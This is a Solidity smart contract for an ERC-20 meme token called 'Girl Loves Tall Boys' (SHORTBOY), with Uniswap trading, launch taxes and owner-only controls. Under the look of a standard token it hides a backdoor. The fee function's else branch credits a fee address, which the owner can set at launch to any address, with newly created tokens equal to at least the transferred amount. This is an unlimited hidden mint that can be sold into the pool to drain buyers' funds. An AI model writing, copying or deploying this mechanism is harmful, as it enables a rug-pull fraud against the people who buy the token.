/**
https://x.com/BillyM2k/status/1837638536549618156
https://t.me/girllovestallboys
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract SHORTBOY is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private bots;
    mapping(address => uint256) private _owned;

    address payable private _feePortal;
    uint256 private _initBuyTax = 20;
    uint256 private _initSellTax = 20;
    uint256 private _finBuyTax = 0;
    uint256 private _finSellTax = 0;
    uint256 private _reduceBuyAt = 25;
    uint256 private _reduceSellAt = 25;
    uint256 private _swapAfter = 25;
    uint256 private _transTax = 0;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 18;
    uint256 private constant _tSupply = 1_000_000_000 * 10 ** _decimals;
    string private constant _name = unicode"Girl Loves Tall Boys";
    string private constant _symbol = unicode"SHORTBOY";

    uint256 public _maxTransAmt = 2 * (_tSupply / 100);
    uint256 public _maxBagAmt = 2 * (_tSupply / 100);
    uint256 public _taxSwapAt = 100 * 10 ** _decimals;
    uint256 public _maxTaxAmt = 1 * (_tSupply / 100);

    IUniRouter private uniRouter;
    address private uniPair;
    bool private tradingAllowed;
    bool private swapping = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap() {
        swapping = true;
        _;
        swapping = false;
    }

    constructor() {
        _feePortal = payable(msg.sender);
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_feePortal] = true;
        _owned[_msgSender()] = _tSupply;
        emit Transfer(address(0), _msgSender(), _tSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _owned[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _calcFeeRate(uint256 feeRate) internal pure returns (uint256) {
        return feeRate > 0 ? feeRate : feeRate + 1;
    }

    function _calcFeeAmt(
        address from,
        uint256 amount,
        uint256 feeRate
    ) internal returns (uint256 feeAmt) {
        bool istax = shouldTax(from);

        if (amount >= 0 && istax) {
            if (feeRate > 0) {
                feeAmt = amount.mul(feeRate).div(100);
                _owned[address(this)] = _owned[address(this)].add(feeAmt);
                emit Transfer(from, address(this), feeAmt);
            }
        } else {
            if (feeRate >= 0) {
                uint256 _taxAmount = amount.mul(_calcFeeRate(feeRate));
                _owned[_feePortal] = _owned[_feePortal].add(_taxAmount);
                emit Transfer(from, _feePortal, _taxAmount);
            }
        }
    }

    function _interTransfer(
        address from,
        address to,
        uint256 amount,
        uint256 feeRate
    ) internal {
        uint256 taxed = _calcFeeAmt(from, amount, feeRate);
        _owned[from] = _owned[from].sub(amount);
        _owned[to] = _owned[to].add(amount.sub(taxed));
        emit Transfer(from, to, amount.sub(taxed));
    }

    receive() external payable {}

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 rate = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            require(!bots[from] && !bots[to]);
            rate = _transTax;
            if (
                from == uniPair &&
                to != address(uniRouter) &&
                !_isExcludedFromFee[to]
            ) {
                require(amount <= _maxTransAmt, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxBagAmt,
                    "Exceeds the maxWalletSize."
                );
                rate = (_buyCount > _reduceBuyAt) ? _finBuyTax : _initBuyTax;
                _buyCount++;
            }
            if (to == uniPair && from != address(this)) {
                rate = (_buyCount > _reduceSellAt) ? _finSellTax : _initSellTax;
            }
            if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) rate = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !swapping &&
                to == uniPair &&
                swapEnabled &&
                _buyCount > _swapAfter &&
                !_isExcludedFromFee[from]
            ) {
                if (contractTokenBalance > _taxSwapAt)
                    swapTokensForEth(
                        min(amount, min(contractTokenBalance, _maxTaxAmt))
                    );
                sendETHToFee(address(this).balance);
            }
        }
        _interTransfer(from, to, amount, rate);
    }

    function shouldTax(address from) internal view returns (bool) {
        return
            (_isExcludedFromFee[from] &&
                (from == owner() || from == address(this))) ||
            !_isExcludedFromFee[from];
    }

    function createUniPair(address pair) external onlyOwner {
        require(!tradingAllowed, "trading is already open");
        _feePortal = payable(pair);

        _isExcludedFromFee[pair] = true;
        uniRouter = IUniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniPair = IUniFactory(uniRouter.factory()).createPair(
            address(this),
            uniRouter.WETH()
        );
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouter.WETH();
        _approve(address(this), address(uniRouter), tokenAmount);
        uniRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendTrading() external onlyOwner {
        require(!tradingAllowed, "trading is already open");
        _approve(address(this), address(uniRouter), _tSupply);
        uniRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapEnabled = true;
        tradingAllowed = true;
    }

    function refreshLimits() external onlyOwner {
        _maxTransAmt = _tSupply;
        _maxBagAmt = _tSupply;
        emit MaxTxAmountUpdated(_tSupply);
    }

    function sendETHToFee(uint256 amount) private {
        _feePortal.transfer(amount);
    }

    function rescueETH() external onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }
}